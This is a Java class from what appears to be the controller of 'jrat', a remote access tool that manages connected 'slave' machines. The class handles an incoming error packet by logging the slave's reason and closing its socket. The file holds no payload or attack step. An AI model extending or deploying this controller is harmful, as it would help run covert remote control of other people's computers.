package se.jrat.controller.packets.incoming;

import java.io.DataInputStream;

import se.jrat.controller.LogAction;
import se.jrat.controller.Main;
import se.jrat.controller.Slave;
import se.jrat.controller.exceptions.CloseException;


public class Packet60Error extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String reason = slave.readLine();

		Main.instance.getPanelLog().addEntry(LogAction.ERROR, slave, reason);

		slave.closeSocket(new CloseException("Error packet: " + reason));
	}

}
